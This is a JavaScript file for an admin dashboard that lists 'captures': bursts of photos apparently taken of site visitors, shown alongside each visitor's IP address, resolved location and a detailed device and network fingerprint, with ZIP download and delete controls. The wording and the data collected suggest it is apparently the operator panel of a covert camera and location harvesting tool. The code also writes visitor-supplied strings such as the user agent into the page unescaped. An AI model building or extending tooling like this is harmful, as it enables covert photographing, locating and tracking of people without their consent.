document.addEventListener('DOMContentLoaded', () => {
    const sessionsContainer = document.getElementById('sessions-container');
    const refreshBtn = document.getElementById('refresh-btn');
    const modal = document.getElementById('photo-modal');
    const modalImg = document.getElementById('modal-img');
    const closeBtn = document.querySelector('.close');

    async function fetchSessions() {
        sessionsContainer.innerHTML = `
            <div class="loading">
                <i class="fas fa-circle-notch fa-spin"></i>
                <p>Refreshing captures...</p>
            </div>
        `;

        try {
            const response = await fetch('/api/sessions');
            const sessions = await response.json();

            if (sessions.length === 0) {
                sessionsContainer.innerHTML = `
                    <div class="loading">
                        <i class="fas fa-camera-retro"></i>
                        <p>No captures yet. Keep waiting!</p>
                    </div>
                `;
                return;
            }

            renderSessions(sessions);
        } catch (error) {
            console.error('Error fetching sessions:', error);
            sessionsContainer.innerHTML = `
                <div class="loading" style="color: var(--danger)">
                    <i class="fas fa-exclamation-triangle"></i>
                    <p>Failed to load sessions. Is the server running?</p>
                </div>
            `;
        }
    }

    function renderSessions(sessions) {
        sessionsContainer.innerHTML = '';

        sessions.forEach(session => {
            const card = document.createElement('div');
            card.className = 'session-card';

            // Handle missing or invalid timestamps
            let timestampStr = 'Unknown Time';
            if (session.timestamp) {
                const date = new Date(session.timestamp);
                if (!isNaN(date.getTime())) {
                    timestampStr = date.toLocaleString();
                }
            } else if (session.session_id && session.session_id.includes('_')) {
                // Try to parse from session_id like 2024-01-31_12-00-00
                const parts = session.session_id.split('_');
                if (parts.length >= 2) {
                    timestampStr = `${parts[0]} ${parts[1].replace(/-/g, ':')}`;
                }
            }

            const location = session.resolved_location || 'Unknown Location';
            const ip = session.ip_address || 'Unknown IP';
            const ua = session.user_agent || 'Unknown Device';
            const count = session.photo_count || 0;

            // Device name simplified for badge
            let deviceSimple = 'Unknown';
            if (ua.includes('(')) {
                deviceSimple = ua.split('(')[1].split(';')[0].split(')')[0];
            } else {
                deviceSimple = ua.substring(0, 15) + '...';
            }

            card.innerHTML = `
                <div class="session-header">
                    <div class="session-info">
                        <div class="info-group">
                            <span class="label">Date & Time</span>
                            <span class="value">${timestampStr}</span>
                        </div>
                        <div class="info-group">
                            <span class="label">Location</span>
                            <span class="value"><i class="fas fa-map-marker-alt" style="color: var(--danger)"></i> ${location}</span>
                        </div>
                        <div class="info-group">
                            <span class="label">Device Info</span>
                            <span class="value device-expand" title="Click to see full User Agent" style="cursor: pointer; border-bottom: 1px dashed var(--text-secondary)">
                                <i class="fas fa-mobile-alt"></i> ${deviceSimple}
                            </span>
                        </div>
                    </div>
                    <div class="session-meta">
                        <span class="badge badge-ip">${ip}</span>
                        <span class="badge badge-count">${count} Photos</span>
                    </div>
                </div>
                <!-- Hardware & Session Details -->
                <div class="details-section hidden" style="background: rgba(15, 23, 42, 0.5); padding: 1.5rem; border-radius: 12px; margin-top: 1rem; border: 1px solid rgba(255, 255, 255, 0.05);">
                    <h4 style="font-size: 0.875rem; color: var(--accent-color); margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.05em;">Device & Network Intelligence</h4>
                    <div class="details-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1rem; font-size: 0.875rem;">
                        <div class="info-group"><span class="label">Platform</span><span class="value">${session.platform || 'N/A'}</span></div>
                        <div class="info-group"><span class="label">Browser RAM</span><span class="value">${session.deviceMemory ? session.deviceMemory + ' GB' : 'N/A'}</span></div>
                        <div class="info-group"><span class="label">CPU Cores</span><span class="value">${session.hardwareConcurrency || 'N/A'}</span></div>
                        <div class="info-group"><span class="label">Screen</span><span class="value">${session.screen_resolution || 'N/A'}</span></div>
                        <div class="info-group"><span class="label">Pixel Ratio</span><span class="value">${session.pixelRatio || 'N/A'}</span></div>
                        <div class="info-group"><span class="label">Timezone</span><span class="value">${session.timezone || 'N/A'}</span></div>
                        <div class="info-group"><span class="label">Language</span><span class="value">${session.language || 'N/A'}</span></div>
                        <div class="info-group"><span class="label">Connection</span><span class="value">${session.connection?.effectiveType || 'N/A'} (${session.connection?.downlink || '?'} Mbps)</span></div>
                    </div>
                    <div style="margin-top: 1rem; padding-top: 1.5rem; border-top: 1px solid rgba(255, 255, 255, 0.05);">
                        <span class="label" style="font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase;">Full User Agent</span>
                        <div style="font-family: monospace; font-size: 0.75rem; background: rgba(0,0,0,0.3); padding: 0.75rem; border-radius: 6px; margin-top: 0.5rem; word-break: break-all; color: #94a3b8;">${ua}</div>
                    </div>
                </div>

                <div class="session-actions" style="margin-top: 1.5rem; display: flex; gap: 0.75rem; flex-wrap: wrap;">
                    <button class="btn btn-primary toggle-gallery" style="flex: 1; min-width: 140px; justify-content: center;">
                        <i class="fas fa-images"></i> View Photos
                    </button>
                    <button class="btn toggle-details" style="flex: 1; min-width: 140px; justify-content: center; background: #334155; color: white;">
                        <i class="fas fa-list-ul"></i> View Details
                    </button>
                    <a href="/api/sessions/${session.session_id}/zip" class="btn" style="flex: 0 0 auto; background: var(--success); color: white; border-radius: 12px; height: 42px; width: 42px; padding: 0; justify-content: center;" title="Download Full Session ZIP">
                        <i class="fas fa-file-zipper"></i>
                    </a>
                    <button class="btn delete-btn" style="flex: 0 0 auto; background-color: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); width: 42px; height: 42px; padding: 0; justify-content: center;">
                        <i class="fas fa-trash-alt"></i>
                    </button>
                </div>
                <div class="photo-gallery">
                    ${renderGallery(session)}
                </div>
            `;

            const toggleBtn = card.querySelector('.toggle-gallery');
            const toggleDetailsBtn = card.querySelector('.toggle-details');
            const deleteBtn = card.querySelector('.delete-btn');
            const gallery = card.querySelector('.photo-gallery');
            const detailsSection = card.querySelector('.details-section');
            const deviceExpand = card.querySelector('.device-expand'); // Keep this if deviceSimple is still used elsewhere
            const fullUa = card.querySelector('.full-ua'); // This will now be inside detailsSection

            // The original deviceExpand and fullUa are replaced by the new details-section.
            // If deviceExpand was meant to toggle the full UA within the new details-section,
            // it needs to be re-evaluated. For now, the full UA is always visible within details.
            // Removing the old deviceExpand listener as it's no longer relevant to the new structure.

            toggleBtn.addEventListener('click', () => {
                const isActive = gallery.classList.contains('active');
                gallery.classList.toggle('active');
                toggleBtn.innerHTML = isActive ?
                    '<i class="fas fa-images"></i> View Photos' :
                    '<i class="fas fa-chevron-up"></i> Hide Photos';
                // Close details if photo gallery is opened
                if (!isActive) {
                    detailsSection.classList.add('hidden');
                    toggleDetailsBtn.innerHTML = '<i class="fas fa-list-ul"></i> View Details';
                }
            });

            toggleDetailsBtn.addEventListener('click', () => {
                const isHidden = detailsSection.classList.contains('hidden');
                detailsSection.classList.toggle('hidden');
                toggleDetailsBtn.innerHTML = isHidden ?
                    '<i class="fas fa-chevron-up"></i> Hide Details' :
                    '<i class="fas fa-list-ul"></i> View Details';
                // Close gallery if details is opened
                if (isHidden) {
                    gallery.classList.remove('active');
                    toggleBtn.innerHTML = '<i class="fas fa-images"></i> View Photos';
                }
            });

            deleteBtn.addEventListener('click', async () => {
                if (confirm('Are you sure you want to delete this session and all its photos?')) {
                    try {
                        const res = await fetch(`/api/sessions/${session.session_id}`, { method: 'DELETE' });
                        if (res.ok) {
                            card.style.opacity = '0';
                            setTimeout(() => card.remove(), 300);
                        } else {
                            alert('Failed to delete session');
                        }
                    } catch (err) {
                        console.error(err);
                        alert('Error deleting session');
                    }
                }
            });

            sessionsContainer.appendChild(card);
        });

        // Add event listeners for images
        document.querySelectorAll('.photo-item').forEach(item => {
            item.addEventListener('click', () => {
                const img = item.querySelector('img');
                modal.style.display = 'block';
                modalImg.src = img.src;

                // Add/Update download button in modal
                let modalDownloadBtn = document.getElementById('modal-download-btn');
                if (!modalDownloadBtn) {
                    modalDownloadBtn = document.createElement('a');
                    modalDownloadBtn.id = 'modal-download-btn';
                    document.querySelector('.modal-content').appendChild(modalDownloadBtn);
                }

                // Convert view URL to download URL
                const downloadUrl = img.src.replace('/admin/photo/', '/api/photo/download/');
                modalDownloadBtn.href = downloadUrl;
                modalDownloadBtn.innerHTML = '<i class="fas fa-download"></i> Download Full Resolution';

                document.getElementById('modal-caption').innerText = item.querySelector('.overlay').innerText;
            });
        });
    }

    function renderGallery(session) {
        let html = '';
        const bursts = session.bursts || {};

        ['initial', 'middle', 'final'].forEach(burstName => {
            const photos = bursts[burstName] || [];
            if (photos.length > 0) {
                html += `
                    <div class="burst-section">
                        <h4 class="burst-title">${burstName} Burst</h4>
                        <div class="photos-grid">
                            ${photos.map((p, idx) => `
                                <div class="photo-item-container">
                                    <div class="photo-item">
                                        <img src="/admin/photo/${session.session_id}/${burstName}/${p}" loading="lazy">
                                        <div class="overlay">${burstName} #${idx + 1}</div>
                                    </div>
                                    <a href="/api/photo/download/${session.session_id}/${burstName}/${p}" class="photo-download-btn" title="Download Photo">
                                        <i class="fas fa-download"></i>
                                    </a>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            }
        });

        return html || '<p style="color: var(--text-secondary); font-size: 0.875rem;">No photos available for this session.</p>';
    }

    refreshBtn.addEventListener('click', fetchSessions);

    closeBtn.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    window.addEventListener('click', (event) => {
        if (event.target == modal) {
            modal.style.display = 'none';
        }
    });

    // Initial fetch
    fetchSessions();

    // Auto-refresh every 30 seconds
    setInterval(fetchSessions, 30000);
});
